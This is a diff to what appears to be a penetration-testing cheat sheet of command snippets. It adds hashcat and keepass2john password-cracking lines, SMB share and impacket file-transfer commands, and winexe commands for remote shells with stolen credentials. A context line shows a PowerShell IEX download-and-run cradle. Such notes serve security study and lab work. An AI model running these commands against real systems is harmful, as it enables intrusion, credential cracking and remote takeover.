@@ -208,7 +208,7 @@ echo $VARIABLE_HERE
 
 EVIL-WINRM
 ----------
-# connect to IP_here as user
+# get shell on IP_here as user
 evil-winrm -i IP_here -u user -p password 
 
 
@@ -289,6 +289,9 @@ HASHCAT
 # permute words in wordlist
 hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule
 
+# crack hash
+hashcat -m hash_format_code_here /path/to/hash /path/to/wordlist
+
 
 HYDRA
 -----
@@ -324,6 +327,9 @@ unshadow passwd_file shadow_file > output_file
 
 # show cracked passwords
 john --show /path/to/hash
+
+# convert kdbx to john
+keepass2john db_here.kdbx
 
 
 LDAP
@@ -559,6 +565,9 @@ IEX(New-Object Net.WebClient).downloadString('http://IP_here/path/to/file')
 # read text file
 get-content file_name-here
 
+# connect to share
+New-PSDrive -Name "drive_name_here" -PSProvider "FileSystem" -Root "\\IP_here\share_name_here"
+
 
 PYTHON
 ------
@@ -687,6 +696,9 @@ smbclient //IP_here/IPC$ -N
 # mount smb share
 sudo mount -t cifs -o 'user=user_here,password=password_here' //IP_here/share_here /path/to/mountpoint
 
+# create share for file transfer
+/path/to/impacket-smbserver share_name_here `password_here`
+
 
 SQLITE3
 --------
@@ -740,5 +752,14 @@ VIM
 ---
 # jump to line
 :line_number_here
+
+
+WINEXE
+------
+# execute file on IP_here as user
+winexe -U domain_here/user_here%password_here file_here.exe
+
+# get shell on IP_here as user
+winexe -U domain_here/user_here%password_here cmd.exe
 
 ```
